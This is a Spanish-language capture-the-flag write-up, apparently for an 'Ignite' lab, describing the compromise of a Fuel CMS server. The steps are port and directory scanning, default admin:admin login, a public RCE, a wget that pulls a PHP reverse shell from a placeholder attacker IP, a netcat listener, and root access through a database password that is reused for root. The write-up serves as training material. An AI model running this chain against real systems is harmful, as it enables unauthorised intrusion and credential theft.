# Ignite

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux identificando una instalación vulnerable de **Fuel CMS**, explotar una vulnerabilidad de **Remote Code Execution (RCE)** para obtener acceso al sistema y escalar privilegios reutilizando credenciales almacenadas en los archivos de configuración de la aplicación.

---

## 🛠️ Tecnologías trabajadas

- Fuel CMS
- Gobuster
- Remote Code Execution (RCE)
- PHP Reverse Shell
- Netcat
- LinPEAS
- Python HTTP Server

---

## 🧠 Metodología

La enumeración inicial mostró que únicamente el puerto **80** estaba expuesto, por lo que toda la superficie de ataque se encontraba en la aplicación web.

La enumeración de directorios permitió identificar una instalación de **Fuel CMS**. Antes de buscar vulnerabilidades complejas, comprobé si existían credenciales por defecto y versiones vulnerables conocidas. Esta estrategia permitió acceder rápidamente al panel de administración y confirmar que la aplicación era vulnerable a una **Remote Code Execution** pública.

Aunque inicialmente disponía de ejecución remota de comandos, decidí obtener una **reverse shell** para trabajar con mayor comodidad durante la fase de post-explotación. Una vez dentro del sistema, la prioridad pasó a ser localizar información sensible. Para ello combiné una enumeración manual con el uso de **LinPEAS**, identificando finalmente un archivo de configuración que almacenaba credenciales reutilizadas por el usuario **root**.

Este laboratorio demuestra el riesgo que supone reutilizar contraseñas entre aplicaciones y cuentas del sistema operativo.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un escaneo completo mediante Nmap.

```bash
nmap -p- 10.130.147.85
```

El resultado mostró un único servicio expuesto:

| Puerto | Servicio |
|---------|----------|
| 80 | HTTP |

Posteriormente realicé una enumeración más detallada.

```bash
nmap -sC -sV -p80 10.130.147.85
```

La información confirmó que toda la superficie de ataque se encontraba en la aplicación web.

---

### 2. Enumeración web

Realicé una enumeración de directorios utilizando Gobuster.

```bash
gobuster dir -u http://10.130.147.85 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

Los recursos más relevantes encontrados fueron:

```
/fuel
```

```
/assets
```

El directorio `/fuel` correspondía al panel de administración del CMS.

Durante la investigación identifiqué que la aplicación utilizaba:

```
Fuel CMS
```

Además, el panel aceptaba las credenciales por defecto:

```
admin:admin
```

---

### 3. Explotación de Fuel CMS

Tras identificar el CMS comprobé que era vulnerable a una **Remote Code Execution (RCE)** pública.

La vulnerabilidad permitía ejecutar comandos mediante el parámetro:

```
filter
```

Utilizando un exploit público obtuve ejecución remota de comandos sobre el servidor.

El acceso inicial correspondía al usuario:

```
www-data
```

---

### 4. Obtención de una shell interactiva

Aunque ya disponía de ejecución remota de comandos, preparé una **reverse shell** para facilitar la post-explotación.

Compartí el archivo desde la máquina atacante utilizando un servidor HTTP.

```bash
python3 -m http.server 8090
```

Desde la máquina víctima descargué la shell.

```bash
wget http://<IP_ATACANTE>:8090/php-reverse-shell.php
```

Preparé un listener con Netcat.

```bash
nc -lvnp 1234
```

Tras ejecutar la reverse shell recibí la conexión correctamente.

Finalmente estabilicé la consola.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

### 5. Enumeración interna

Una vez dentro del sistema recuperé la primera flag ubicada en:

```
/home/www-data/flag.txt
```

Posteriormente ejecuté **LinPEAS** para automatizar parte de la enumeración.

```bash
chmod +x linpeas.sh
./linpeas.sh
```

La revisión manual confirmó un archivo especialmente interesante:

```
/var/www/html/fuel/application/config/database.php
```

Al analizarlo encontré las siguientes credenciales:

```
Usuario: root

Contraseña: mememe
```

---

### 6. Escalada de privilegios

Las credenciales recuperadas eran reutilizadas por el usuario **root** del sistema.

Simplemente inicié sesión utilizando:

```bash
su root
```

Tras introducir la contraseña obtenida conseguí acceso completo al sistema.

Finalmente recuperé la última flag ubicada en:

```
/root/root.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió practicar una cadena de explotación basada en vulnerabilidades conocidas de aplicaciones web y una mala gestión de credenciales.
- Identificar instalaciones de **Fuel CMS**.
- Detectar credenciales por defecto en aplicaciones web.
- Explotar una **Remote Code Execution (RCE)** mediante un exploit público.
- Transformar una ejecución remota de comandos en una shell interactiva.
- Utilizar **LinPEAS** como apoyo durante la enumeración local.
- Localizar archivos de configuración sensibles en aplicaciones web.
- Comprender el riesgo de reutilizar contraseñas entre la aplicación y el sistema operativo.
ción.
